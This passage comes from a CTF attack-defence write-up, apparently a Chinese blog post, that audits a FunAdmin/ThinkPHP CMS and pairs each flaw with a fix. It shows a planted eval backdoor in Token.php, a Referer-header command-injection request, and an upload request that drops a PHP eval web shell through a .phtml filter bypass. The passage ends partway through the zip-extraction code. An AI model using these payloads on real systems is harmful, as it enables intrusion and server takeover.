invoke__">lang</span>(<span class="hljs-string">&#x27;file not exists!&#x27;</span>)];<br>            <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">json</span>(<span class="hljs-variable">$result</span>);<br>        &#125;<br><br>        <span class="hljs-comment">// 获取文件名</span><br>        <span class="hljs-variable">$fileName</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$file</span>);<br><br>        <span class="hljs-comment">// 设置HTTP响应头</span><br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: application/octet-stream&#x27;</span>);<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Disposition: attachment; filename=&#x27;</span> . <span class="hljs-variable">$fileName</span>);<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Length: &#x27;</span> . <span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$file</span>));<br><br>        <span class="hljs-comment">// 读取文件并输出给用户</span><br>        <span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$file</span>);<br><br>        <span class="hljs-comment">// 终止脚本继续执行</span><br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="漏洞2-默认后门-1"><a href="#漏洞2-默认后门-1" class="headerlink" title="漏洞2-默认后门"></a>漏洞2-默认后门</h2><p><code>\app\api\controller\v1\Token.php</code>存在任意命令执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">app</span>\<span class="hljs-title class_">api</span>\<span class="hljs-title class_">controller</span>\<span class="hljs-title class_">v1</span>;<br><br><span class="hljs-keyword">use</span> <span class="hljs-title">fun</span>\<span class="hljs-title">auth</span>\<span class="hljs-title">Api</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">App</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">facade</span>\<span class="hljs-title">Request</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">facade</span>\<span class="hljs-title">Config</span>;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 生成token</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Token</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Api</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$noAuth</span> = [<span class="hljs-string">&#x27;*&#x27;</span>];<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">App <span class="hljs-variable">$app</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">__construct</span>(<span class="hljs-variable">$app</span>);<br>        <span class="hljs-comment">//跨域</span><br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Access-Control-Allow-Origin:*&#x27;</span>);<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Access-Control-Allow-Headers:Accept,Referer,Host,Keep-Alive,User-Agent,X-Requested-With,Cache-Control,Content-Type,Cookie,token&#x27;</span>);<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Access-Control-Allow-Credentials:true&#x27;</span>);<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Access-Control-Allow-Methods:GET, POST, PATCH, PUT, DELETE,OPTIONS&#x27;</span>);<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">build</span>(<span class="hljs-params">Request <span class="hljs-variable">$request</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$class</span> = <span class="hljs-title function_ invoke__">ucwords</span>(<span class="hljs-string">&#x27;\\fun\\auth\\&#x27;</span>.<span class="hljs-title function_ invoke__">ucfirst</span>(<span class="hljs-variable">$this</span>-&gt;type).<span class="hljs-string">&#x27;Token&#x27;</span>);<br>        <span class="hljs-variable">$token</span> = <span class="hljs-variable">$class</span>::<span class="hljs-title function_ invoke__">instance</span>();<br>        <span class="hljs-variable">$token</span>-&gt;<span class="hljs-title function_ invoke__">build</span>();<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">refresh</span>(<span class="hljs-params">Request <span class="hljs-variable">$request</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$class</span> = <span class="hljs-title function_ invoke__">ucwords</span>(<span class="hljs-string">&#x27;\\fun\\auth\\&#x27;</span>.<span class="hljs-title function_ invoke__">ucfirst</span>(<span class="hljs-variable">$this</span>-&gt;type).<span class="hljs-string">&#x27;Token&#x27;</span>);<br>        <span class="hljs-variable">$token</span> = <span class="hljs-variable">$class</span>::<span class="hljs-title function_ invoke__">instance</span>();<br>        <span class="hljs-variable">$token</span>-&gt;<span class="hljs-title function_ invoke__">refresh</span>();<br><br>    &#125;<br>       <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"></span>)</span>&#123;<br>    @<span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">getallheaders</span>()[<span class="hljs-string">&#x27;Referer&#x27;</span>]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>攻击：</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /api/v1.token/test HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">8.147.134.118:24631</span><br><span class="hljs-attribute">Referer</span>:system(<span class="hljs-string">&quot;cat /flag&quot;</span>);<br><br><br></code></pre></td></tr></table></figure><p><strong>修复：</strong></p><p>添加注释</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-comment">//@eval(getallheaders()[&#x27;Referer&#x27;]);</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="漏洞3-文件上传getshell"><a href="#漏洞3-文件上传getshell" class="headerlink" title="漏洞3-文件上传getshell"></a>漏洞3-文件上传getshell</h2><p><del>貌似还有个任意文件上传，比赛的时候没时间看了</del></p><p><strong>赛后复现</strong></p><p>注册后的基本设置有上传头像的地方</p><p><img src="/img/awd/ccb-cms-2.png"></p><p>定位代码</p><p>&#x2F;app&#x2F;common&#x2F;service&#x2F;UploadService.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> $file</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> bool</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> Exception</span><br><span class="hljs-comment"> * 检测文件是否符合要求</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkFile</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//禁止上传PHP和HTML.ssh等脚本文件</span><br>    <span class="hljs-keyword">if</span> (<br><span class="hljs-comment">//           in_array($this-&gt;file-&gt;getMime(),</span><br><span class="hljs-comment">//               [&#x27;application/octet-stream&#x27;, &#x27;text/html&#x27;,&#x27;application/x-javascript&#x27;,&#x27;text/x-php&#x27;,&#x27;aplication/x-msdownload&#x27;,&#x27;application/java-archive&#x27;])</span><br><span class="hljs-comment">//           ||</span><br>    <span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$this</span>-&gt;file-&gt;<span class="hljs-title function_ invoke__">extension</span>(),<br>        [<span class="hljs-string">&#x27;php&#x27;</span>, <span class="hljs-string">&#x27;html&#x27;</span>, <span class="hljs-string">&#x27;htm&#x27;</span>,<span class="hljs-string">&#x27;xml&#x27;</span>,<span class="hljs-string">&#x27;ssh&#x27;</span>,<span class="hljs-string">&#x27;bat&#x27;</span>,<span class="hljs-string">&#x27;jar&#x27;</span>,<span class="hljs-string">&#x27;java&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-title function_ invoke__">lang</span>(<span class="hljs-string">&#x27;File format is limited&#x27;</span>));<br>    &#125;<br>    <span class="hljs-comment">//文件大小限制</span><br>    <span class="hljs-keyword">if</span> ((<span class="hljs-variable language_">$this</span>-&gt;file-&gt;<span class="hljs-title function_ invoke__">getSize</span>() &gt; <span class="hljs-variable language_">$this</span>-&gt;fileMaxsize*<span class="hljs-number">1024</span>)) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-title function_ invoke__">lang</span>(<span class="hljs-string">&#x27;File size is limited&#x27;</span>));<br>    &#125;<br>    <span class="hljs-comment">//文件类型限制</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;fileExt !=<span class="hljs-string">&#x27;*&#x27;</span> &amp;&amp; !<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$this</span>-&gt;file-&gt;<span class="hljs-title function_ invoke__">extension</span>(),<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;,&#x27;</span>,<span class="hljs-variable">$this</span>-&gt;fileExt)))&#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-title function_ invoke__">lang</span>(<span class="hljs-string">&#x27;File type is limited&#x27;</span>));<br>    &#125;<br>    <span class="hljs-variable">$file_ext</span> = <span class="hljs-variable language_">$this</span>-&gt;file-&gt;<span class="hljs-title function_ invoke__">extension</span>();<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$this</span>-&gt;file-&gt;<span class="hljs-title function_ invoke__">getMime</span>(), [<span class="hljs-string">&#x27;image/gif&#x27;</span>, <span class="hljs-string">&#x27;image/jpg&#x27;</span>, <span class="hljs-string">&#x27;image/jpeg&#x27;</span>, <span class="hljs-string">&#x27;image/bmp&#x27;</span>,<span class="hljs-string">&#x27;image/png&#x27;</span>, <span class="hljs-string">&#x27;image/webp&#x27;</span>]) || <span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, [<span class="hljs-string">&#x27;gif&#x27;</span>, <span class="hljs-string">&#x27;jpg&#x27;</span>, <span class="hljs-string">&#x27;jpeg&#x27;</span>, <span class="hljs-string">&#x27;bmp&#x27;</span>, <span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;webp&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$imgInfo</span> = <span class="hljs-title function_ invoke__">getimagesize</span>(<span class="hljs-variable">$this</span>-&gt;file-&gt;<span class="hljs-title function_ invoke__">getPathname</span>());<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$imgInfo</span> || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$imgInfo</span>[<span class="hljs-number">0</span>]) || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$imgInfo</span>[<span class="hljs-number">1</span>])) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-title function_ invoke__">lang</span>(<span class="hljs-string">&#x27;Uploaded file is not a valid image&#x27;</span>));<br>        &#125;<br>        <span class="hljs-variable language_">$this</span>-&gt;width = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$imgInfo</span>[<span class="hljs-number">0</span>]) ? <span class="hljs-variable">$imgInfo</span>[<span class="hljs-number">0</span>] : <span class="hljs-number">0</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;height = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$imgInfo</span>[<span class="hljs-number">1</span>]) ? <span class="hljs-variable">$imgInfo</span>[<span class="hljs-number">1</span>] : <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>限制了部分后缀，用<code>phtml</code>绕过</p><p><img src="/img/awd/ccb-cms-3.png"></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs makefile">POST未授权上传，不需要登录<br><br>POST /frontend/ajax/uploads HTTP/1.1<br><span class="hljs-section">Host: 192.168.100.129</span><br><span class="hljs-section">Content-Length: 206</span><br><span class="hljs-section">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="hljs-section">X-Requested-With: XMLHttpRequest</span><br><span class="hljs-section">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36</span><br><span class="hljs-section">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDbISZWkAvBPdc8u0</span><br><span class="hljs-section">Origin: http://192.168.100.129</span><br><span class="hljs-section">Referer: http://192.168.100.129/frontend/member/set.html</span><br><span class="hljs-section">Accept-Encoding: gzip, deflate</span><br><span class="hljs-section">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="hljs-section">Connection: close</span><br><br>------WebKitFormBoundaryDbISZWkAvBPdc8u0<br><span class="hljs-section">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.phtml&quot;</span><br><span class="hljs-section">Content-Type: image/jpeg</span><br><br>&lt;?php<br>eval($_POST[&#x27;a&#x27;]);<br>------WebKitFormBoundaryDbISZWkAvBPdc8u0--<br><br></code></pre></td></tr></table></figure><p><strong>修复</strong></p><p>便捷的：增加对phtml的过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$this</span>-&gt;file-&gt;<span class="hljs-title function_ invoke__">extension</span>(),<br>            [<span class="hljs-string">&#x27;php&#x27;</span>, <span class="hljs-string">&#x27;html&#x27;</span>, <span class="hljs-string">&#x27;htm&#x27;</span>,<span class="hljs-string">&#x27;xml&#x27;</span>,<span class="hljs-string">&#x27;ssh&#x27;</span>,<span class="hljs-string">&#x27;bat&#x27;</span>,<span class="hljs-string">&#x27;jar&#x27;</span>,<span class="hljs-string">&#x27;java&#x27;</span>,<span class="hljs-string">&#x27;phtml&#x27;</span>])) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-title function_ invoke__">lang</span>(<span class="hljs-string">&#x27;File format is limited&#x27;</span>));<br>        &#125;<br></code></pre></td></tr></table></figure><p>或者稍微麻烦一点的，增加一个白名单</p><p>&#x2F;app&#x2F;frontend&#x2F;controller&#x2F;Ajax.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> \think\response\Json</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> \think\db\exception\DataNotFoundException</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> \think\db\exception\DbException</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> \think\db\exception\ModelNotFoundException</span><br><span class="hljs-comment"> * 文件上传总入口 集成qiniu ali tenxunoss</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">uploads</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">try</span> &#123;<br><br>        <span class="hljs-variable">$list</span> = [<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>,<span class="hljs-string">&#x27;jpeg&#x27;</span>];<br>        <span class="hljs-variable">$file</span> = <span class="hljs-variable language_">$this</span>-&gt;request-&gt;<span class="hljs-title function_ invoke__">file</span>(<span class="hljs-string">&#x27;file&#x27;</span>);<br>        <span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">getOriginalName</span>(), PATHINFO_EXTENSION));<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$ext</span>,<span class="hljs-variable">$list</span>))&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&#x27;NO&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-variable">$upload</span> = <span class="hljs-title class_">UploadService</span>::<span class="hljs-title function_ invoke__">instance</span>();<br>        <span class="hljs-variable">$result</span> = <span class="hljs-variable">$upload</span>-&gt;<span class="hljs-title function_ invoke__">uploads</span>(<span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&#x27;member.id&#x27;</span>),<span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">json</span>(<span class="hljs-variable">$result</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">error</span>(<span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="漏洞4-后台文件上传-文件包含RCE"><a href="#漏洞4-后台文件上传-文件包含RCE" class="headerlink" title="漏洞4-后台文件上传+文件包含RCE"></a>漏洞4-后台文件上传+文件包含RCE</h2><p><strong>赛后复现</strong></p><p>F12 泄露账号密码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<br>    layui.<span class="hljs-title function_">use</span>([<span class="hljs-string">&#x27;layer&#x27;</span>, <span class="hljs-string">&#x27;jquery&#x27;</span>], <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">var</span> $ = layui.<span class="hljs-property">jquery</span>,<br>            layer = layui.<span class="hljs-property">layer</span>;<br>        $(<span class="hljs-string">&#x27;.layui-tips&#x27;</span>).<span class="hljs-title function_">hover</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>            layer.<span class="hljs-title function_">tips</span>(<span class="hljs-string">&#x27;账号admin,密码123456&#x27;</span>);<br>        &#125;)<br>    &#125;)<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>访问<code>/backend</code>登录后台</p><p>发现有一个离线安装插件的功能</p><p>审计代码</p><p>&#x2F;app&#x2F;backend&#x2F;controller&#x2F;Addon.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@NodeAnnotation</span>(title=&quot;离线安装&quot;)</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> Exception</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">localinstall</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;request-&gt;<span class="hljs-title function_ invoke__">isAjax</span>())&#123;<br>        <span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br>        <span class="hljs-variable">$urls</span> = <span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-title function_ invoke__">input</span>(<span class="hljs-string">&#x27;url&#x27;</span>));<br>        <span class="hljs-variable">$file</span> = <span class="hljs-variable">$urls</span>[<span class="hljs-string">&#x27;path&#x27;</span>]??<span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$file</span> &amp;&amp; <span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">&#x27;.&#x27;</span>.<span class="hljs-variable">$file</span>))&#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-variable">$res</span> = <span class="hljs-title class_">ZipHelper</span>::<span class="hljs-title function_ invoke__">unzip</span>(<span class="hljs-string">&#x27;.&#x27;</span>.<span class="hljs-variable">$file</span>,<span class="hljs-string">&#x27;../addons&#x27;</span>);<br>            &#125;<span class="hljs-keyword">catch</span> (\<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>)&#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">error</span>(<span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>());<br>            &#125;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>)&#123;<br>                <span class="hljs-variable">$index</span> = <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$res</span>, <span class="hljs-string">&#x27;/&#x27;</span>);<br>                <span class="hljs-variable">$addon</span> = <span class="hljs-variable">$index</span> ? <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$res</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$index</span>):<span class="hljs-variable">$res</span>;<br>                <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">install</span>(<span class="hljs-variable">$addon</span>,<span class="hljs-string">&#x27;local&#x27;</span>);<br>            &#125;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">success</span>(<span class="hljs-string">&#x27;upload success&#x27;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>&#x2F;vendor&#x2F;funadmin&#x2F;fun-addons&#x2F;src&#x2F;helper&#x2F;ZipHelper.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *  解压文件</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> $zipFile 相对文件路劲</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> $folderPath 相对文件夹路劲</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">unzip</span>(<span class="hljs-params"> <span class="hljs-variable">$zipFile</span>,<span class="hljs-variable">$folderPath</span>,<span class="hljs-variable">$addon</span>=<span class="hljs-number">0</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// Initialize archive object</span><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">class_exists</span>(<span class="hljs-string">&#x27;ZipArchive&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">\Exception</span>(<span class="hljs-string">&#x27;ZinArchive not find&#x27;</span>);<br>    &#125;<br>    <span class="hljs-variable">$zip</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">\ZipArchive</span>();<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-variable">$zipFile</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (\<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>        <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">\Exception</span>(<span class="hljs-string">&#x27;Unable to open the zip file&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$folderPath</span>)) &#123;<br>        @<span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$folderPath</span>, <span class="hljs-number">0755</span>);<br>    &#125;<br>    <span class="hljs-variable">$fileDir</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">getNameIndex</span>(<span class="hljs-number">0</span>), <span class="hljs-string">&#x27;/&#x27;</span>);<br>    <span class="hljs-comment">//解压压缩包</span><br>    <span 